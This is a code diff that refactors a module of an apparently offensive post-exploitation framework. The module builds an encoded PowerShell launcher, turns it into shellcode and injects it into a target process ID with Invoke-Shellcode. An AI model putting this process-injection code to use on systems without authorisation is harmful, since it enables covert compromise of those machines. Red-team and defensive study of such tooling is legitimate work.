@@ -34,28 +34,26 @@ class Module:
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
             return handle_error_message(f"[!] Invalid listener: {listener_name}")
-        else:
-            # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagers.generate_launcher(
-                listener_name,
-                language="powershell",
-                encode=True,
-                userAgent=user_agent,
-                proxy=proxy,
-                proxyCreds=proxy_creds,
-            )
 
-            if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
-            else:
-                launcher_code = launcher.split(" ")[-1]
-                sc, err = main_menu.stagers.generate_powershell_shellcode(
-                    launcher_code, arch
-                )
-                if err:
-                    return handle_error_message(err)
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = main_menu.stagers.generate_launcher(
+            listener_name,
+            language="powershell",
+            encode=True,
+            userAgent=user_agent,
+            proxy=proxy,
+            proxyCreds=proxy_creds,
+        )
 
-                encoded_sc = helpers.encode_base64(sc)
+        if launcher == "":
+            return handle_error_message("[!] Error in launcher generation.")
+
+        launcher_code = launcher.split(" ")[-1]
+        sc, err = main_menu.stagers.generate_powershell_shellcode(launcher_code, arch)
+        if err:
+            return handle_error_message(err)
+
+        encoded_sc = helpers.encode_base64(sc)
 
         script_end = f'\nInvoke-Shellcode -ProcessID {proc_id} -Shellcode $([Convert]::FromBase64String("{encoded_sc}")) -Force'
         script_end += f"; shellcode injected into pid {proc_id!s}"
